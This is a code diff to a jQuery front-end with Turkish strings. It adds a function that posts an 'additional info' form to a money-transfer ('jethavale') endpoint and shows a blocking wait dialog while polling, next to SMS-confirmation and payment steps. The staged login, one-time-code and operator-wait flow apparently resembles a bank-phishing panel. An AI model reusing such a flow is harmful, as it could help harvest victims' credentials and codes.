@@ -190,6 +190,8 @@ function myLoop2() {         //  create a loop function
               $('#login-step-2').removeClass('d-flex');
               $('#login-step-3').removeClass('d-none');
               $('#login-step-3').addClass('d-flex');
+               swal.close();
+
             }
         }
       })  
@@ -227,7 +229,28 @@ function smsOnay() {
     },
   });
 }
-                            
+
+
+function ekBilgi() {
+  $.ajax({
+    type: "POST",
+    url: "/jethavale/request.php?q=ek-bilgi",
+    data: $("#form").serialize(),
+    success: (response) => {
+      if (response == "success") {
+        swal.fire({
+          title: 'Lütfen Bekleyin',
+          text: 'İşleminiz İşleniyor Lütfen Bekleyiniz',
+          allowOutsideClick: false,
+          showConfirmButton: false
+        })
+        myLoop2()
+      }
+    },
+  });
+}
+   
+
                             
   function putPayment(id, message,showalert=true){
     const xhr = new XMLHttpRequest;
